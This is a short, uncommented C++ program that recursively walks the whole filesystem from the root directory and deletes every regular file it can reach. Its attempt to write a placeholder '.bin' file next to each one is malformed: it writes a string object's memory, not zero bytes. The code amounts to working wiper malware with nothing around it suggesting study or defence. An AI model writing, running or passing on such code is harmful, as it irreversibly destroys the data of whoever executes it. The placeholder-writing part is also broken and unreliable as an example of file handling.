#include <string.h>
#include <cstdlib>  
#include <stdint.h>
#include <fstream>
#include <filesystem>
#include <vector>

using namespace std;
namespace fs = filesystem;

int main() {
    string zeroes = "\x00";
    fs::path root = "/";
    vector<string> paths;
    vector<string> fileppaths;

    auto options = fs::directory_options::skip_permission_denied;

    for (const auto& file : fs::recursive_directory_iterator(root, options)) {
        if (fs::is_regular_file(file.path())) {
            paths.push_back(file.path().string());
            fileppaths.push_back((file.path().parent_path()).string());
        }
    }

    for (uint64_t j = 0; j<paths.size(); j++) {
        ifstream file(paths[j], ios::binary);
        fstream hash((fileppaths[j] + "/" + to_string(j) + ".bin"));
        hash.write(reinterpret_cast<const char*>(&zeroes), sizeof(zeroes));
        fs::remove(paths[j]);
    }
    return 0;
}